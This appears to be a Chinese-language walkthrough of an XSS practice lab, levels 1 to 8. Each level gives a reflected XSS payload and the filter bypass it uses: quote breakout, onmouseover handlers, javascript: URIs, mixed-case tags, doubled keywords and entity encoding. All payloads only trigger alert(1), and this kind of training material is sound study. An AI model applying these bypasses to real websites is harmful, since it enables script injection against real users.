## level1
反射型XSS</br>
```java
payload：?name=<script>alert(1)</script>
```

## level2
```java
payload："><script>alert(1)</script>
```

## level3
输入1<"">''内容然后搜索，查看源代码，两个回显点均过滤特殊字符，但是单引号未过滤。</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(1).png height="300" width="650">
```java
payload：1' onmouseover='alert(1)
```
鼠标划过输入框上面即弹窗：</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(2).png height="300" width="650">

## level4
跟上一关一样，双引号的不同。</br>
```java
payload：1” onmouseover=“alert(1)
```

## level5
script大小写、on事件被禁用：</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(3).png height="300" width="650"></br>
但是双引号、单引号、尖括号都可以用</br>
```java
payload：1"><a href="javascript:alert(1)">
```

## level6
script、on事件、href链接相关词被转义：</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(4).png height="300" width="650"></br>
可以大小写绕过：</br>
```java
payload：1"><scRipt>alert(1)</scRipt>
```

## level7
输入<script><onerror><a hRef>测试，发现对关键字进行了过滤，且大小写不能绕过：</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(5).png height="300" width="650"></br>
发现对关键字只进行了一次过滤，可以对关键字双写绕过：</br>
```java
payload：1" oonnmouseover="alert(1)
```
  
## level8
先输入一些关键字符[<scripT><oNerror><a Href>""'']，测试防御情况，看到关键字都被转义，看到a标签考虑使用”<a href="javascript:alert(1)"></a>“，页面有回显的超链接，想办法将script转码一下。</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(6).png height="300" width="650"></br>
尝试用如下方式对标签属性值进行转码：</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(7).png></br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(8).png></br>
```java
payload：javasc&#13ript:alert(1)
```













